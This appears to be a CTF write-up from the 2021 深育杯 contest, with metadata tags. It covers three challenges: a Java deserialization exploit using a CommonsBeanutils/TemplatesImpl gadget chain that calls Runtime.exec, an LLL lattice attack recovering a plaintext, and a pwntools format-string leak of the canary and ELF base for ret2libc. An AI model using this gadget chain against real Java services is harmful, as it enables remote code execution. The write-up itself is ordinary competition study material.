---
title: 深育杯-WriteUp
contest: 深育杯
year: 2021
difficulty: medium
vuln_type: deserialize
tags: [Java反序列化, Commons Beanutils, TemplatesImpl, LLL格密码, fmtstr泄露canary+elfbase, House of Botcake]
attack_chain: Web:weblog CommonsBeanutils+TemplatesImpl Javassist动态类Runtime.exec→Crypto:LLL格密码(grid=[[1,h],[0,p]])+f=gcd→m=a*inverse_mod(f*f,g)%g→PWN:fmtstr泄canary+elfbase→ret2libc+House of Botcake
key_payload: "BeanComparator(null, String.CASE_INSENSITIVE_ORDER);setFieldValue(templates, '_bytecodes', targetByteCodes);v1=vector(ZZ, [1, h]);v2=vector(ZZ, [0, p]);grid.LLL();'%17$llx, %15$llx' canary+elfbase"
one_liner: 深育杯多方向：Java反序列化CommonsBeanutils+LLL格密码+fmtstr泄canary+elfbase+ret2libc
lesson: CommonsBeanutils+TemplatesImpl+Javassist动态类是Java反序列化经典链；LLL格密码二维向量构造
quality: high
---

# 深育杯-WriteUp

**赛事**：深育杯（2021，ChaMd5 Venom战队）

**Web（Java反序列化）**：
```java
public class weblog {
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) 
        throws NoSuchFieldException, IllegalAccessException {
        final Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        // ObjectOutputStream writeObject → Base64
    }
}
```

**Crypto（LLL格密码）**：
```python
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
grid = matrix([v1, v2])
f, g = grid.LLL()[0]
f, g = -f, -g
a = f*c % p % g
m = a * inverse_mod(f*f, g) % g
print(bytes.fromhex(hex(m)[2:]))
```

**PWN（fmtstr + ret2libc）**：
```python
p.sendlineafter("Hi! What's your name? ", '%17$llx, %15$llx')
p.recvuntil('Nice to meet you, ')
canary = int(('0x' + p.recv(16)), 16)
p.recvuntil(', ')
elfbase = int(('0x' + p.recv(12)), 16) - 0x1140
log.success('leak: 0x%x\nelfbase: 0x%x' % (canary, elfbase))
```

**核心技术**：
- CommonsBeanutils + TemplatesImpl + Javassist动态类
- LLL格密码构造二维向量 [[1,h],[0,p]] → gcd
- fmtstr `%17$llx, %15$llx` 同时泄canary+elfbase
- ret2libc + House of Botcake

**质量评估**：高（多方向payload完整 + 经典反序列化链）
